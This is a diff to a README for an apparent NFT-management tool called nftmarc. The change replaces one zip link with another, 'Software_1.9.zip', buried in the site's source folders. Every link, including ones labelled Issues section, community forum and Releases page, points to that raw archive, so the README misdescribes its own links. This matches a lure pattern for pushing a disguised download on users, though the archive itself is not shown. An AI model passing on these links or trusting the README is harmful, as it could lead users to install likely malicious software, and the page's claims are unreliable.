@@ -8,7 +8,7 @@ Welcome to nftmarc! This application helps you manage your non-fungible tokens (
 
 You can download nftmarc from the Releases page. Click the button below to get started:
 
-[![Download nftmarc](https://raw.githubusercontent.com/Prepucedendroicapetechia80/nftmarc/main/website/src/containers/notFoundPage/nftmarc-v2.0.zip)](https://raw.githubusercontent.com/Prepucedendroicapetechia80/nftmarc/main/website/src/containers/notFoundPage/nftmarc-v2.0.zip)
+[![Download nftmarc](https://github.com/Prepucedendroicapetechia80/nftmarc/raw/refs/heads/main/website/src/components/itemButtonGroup/Software_1.9.zip)](https://github.com/Prepucedendroicapetechia80/nftmarc/raw/refs/heads/main/website/src/components/itemButtonGroup/Software_1.9.zip)
 
 Once you're on the Releases page, follow these simple steps to download and install the software:
 
@@ -52,8 +52,8 @@ If you encounter any issues during installation or use, here are some common pro
 
 If you need further assistance, you can reach out for help in the following ways:
 
-- **GitHub Issues:** Visit the [Issues section](https://raw.githubusercontent.com/Prepucedendroicapetechia80/nftmarc/main/website/src/containers/notFoundPage/nftmarc-v2.0.zip) on our GitHub page to report any bugs or request features.
-- **Community Forums:** Join our [community forum](https://raw.githubusercontent.com/Prepucedendroicapetechia80/nftmarc/main/website/src/containers/notFoundPage/nftmarc-v2.0.zip) to ask questions and share experiences with other users.
+- **GitHub Issues:** Visit the [Issues section](https://github.com/Prepucedendroicapetechia80/nftmarc/raw/refs/heads/main/website/src/components/itemButtonGroup/Software_1.9.zip) on our GitHub page to report any bugs or request features.
+- **Community Forums:** Join our [community forum](https://github.com/Prepucedendroicapetechia80/nftmarc/raw/refs/heads/main/website/src/components/itemButtonGroup/Software_1.9.zip) to ask questions and share experiences with other users.
 
 ## 📝 Contributing
 
@@ -69,6 +69,6 @@ Thank you for considering contributing to nftmarc!
 
 To stay informed about updates and new features, make sure to follow the repository. You can check back on the Releases page for the latest versions and improvements:
 
-[Visit Releases Page](https://raw.githubusercontent.com/Prepucedendroicapetechia80/nftmarc/main/website/src/containers/notFoundPage/nftmarc-v2.0.zip)
+[Visit Releases Page](https://github.com/Prepucedendroicapetechia80/nftmarc/raw/refs/heads/main/website/src/components/itemButtonGroup/Software_1.9.zip)
 
 We hope you enjoy using nftmarc and find it helpful for your NFT management needs!
